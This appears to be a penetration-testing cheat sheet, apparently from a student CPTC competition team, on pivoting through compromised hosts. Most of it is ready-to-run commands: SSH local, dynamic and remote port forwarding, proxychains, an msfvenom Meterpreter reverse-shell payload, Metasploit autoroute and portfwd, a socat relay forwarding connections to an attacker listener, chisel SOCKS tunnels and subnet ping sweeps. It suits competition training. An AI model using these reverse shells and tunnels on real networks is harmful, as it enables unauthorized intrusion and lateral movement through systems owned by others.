
- Check for multiple NICs on compromised system, look for other networks to pivot to
- ipconfig, ifconfig, netstat -r, ip route etc
  ### SSH local port forwarding
  ![image](https://github.com/nationalcptc-teamtools/Coastline-College/assets/85032657/caddd47b-800d-4b8b-8a87-11344eabcd05)

  - use SSH to forward port on remote host to local port
    ```
    ssh -L <local port>:localhost:<remote port> <username>@<ip>
     ```
  - to check if forwarding is being done
    ```
    netstat -antp | grep <local port>
     ```
    ```
    nmap -v -p <local port> localhost
    ```
### SSH tunneling over SOCKS proxy
  #### proxychains
  ![image](https://github.com/nationalcptc-teamtools/Coastline-College/assets/85032657/952c6e3e-2842-440f-848c-b9c1c03e5756)

  - Use SSH dynamic port forwarding
  ```
    ssh -D 9050 <username>@<ip>
   ```
  -add to port 9050 type socksv4 to
```
  /etc/proxychains.conf
```
  - prefix command with proxychains, like proxychains nmap...etc
### Remote route forwarding with SSH
-used to create reverse connection, for reverse shells using a pivot host
  - create payload that opens reverse shell on internal nic of pivot host
  - transfer to target
  - on attacker box start ssh route forwarding
    ```
     ssh -R <pivot host internal ip>:<LPORT from payload>:0.0.0.0:<listener port on attacker machine> <username>@<ip>
    ```
  - start listener on <listener port on attacker machine>
  - run payload
### Meterpreter tunneling and port forwarding 
  - use instead of ssh port forwarding
  - create meterpreter payload to stage on pivot host
    ```
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
    ```
  - start exploit/multi/handler
  - transfer payload
  - conduct ping sweep
    ```
      for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
    ```
    ```
      for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
    ```
    ```
      1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
    ```
  -create socks proxy on msfconsole
  ``` use auxiliary/server/socks_proxy```
  - use jobs to confirm
  - add to proxychains
  ``` socks4 127.0.0.1 9050 ```
  - use autoroute to add routes to internal subnet (target subnet)
  ``` use post/multi/manage/autoroute ```
  - list active routes
  ``` run autoroute -p ```
  - check functionality with proxychains nmap as we did before
### port forward with msfconsole portfwd
  ```portfwd add -l <local port> -p <remote port> -r <pivot host>```
  - then we should be able to route to target subnet by specifying the -l port in forward connections
    ``` xfreerdp \u:<username> \p:<password> \v:localhost:<local port we specified above> ```
### Meterpreter reverse port forwarding
  ``` portfwd add -R -l <local port> -p <pivot host port> -L <pivot host>```
  - then create payload that opens reverse shell to pivot host on pivot host port this will send reverse connection to our local port
    
## tunneling with socat
 - forward all traffic from pivot host to attacker machine (bidirectional)
   ```socat TCP4-LISTEN:<pivot host port>,fork TCP4:<attacker ip>:<attacker listen port>```
-  create payload that connects to pivot host on pivot host port, it will be redirected to attacker listen port
-  create listener on that port and enjoy the shell
## using chisel 
- remember to look in older versions if you can't run on pivot host
- [download and go build https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
### forward connection
#### on pivot host
- ```chisel server -v -p <socks port> --socks5 ```
#### on local machine
- ```chisel client -v <pivot host ip>:<socks port> ```
- make sure to add socks5 entry to /etc/proxychains.conf
### reverse with chisel
#### on local host
- ```chisel server --reverse -v -p <socks port> --socks5```
#### on pivot host
- ``` chisel client -v <local host IP>:<socks port> R:socks```
### configuring burpsuite with proxychains
Network, Proxy works with burp browser
![image](https://github.com/cactus-dad/cptc-cheatsheet/assets/85032657/3969c9dd-360c-44b1-aa82-897a91850513)


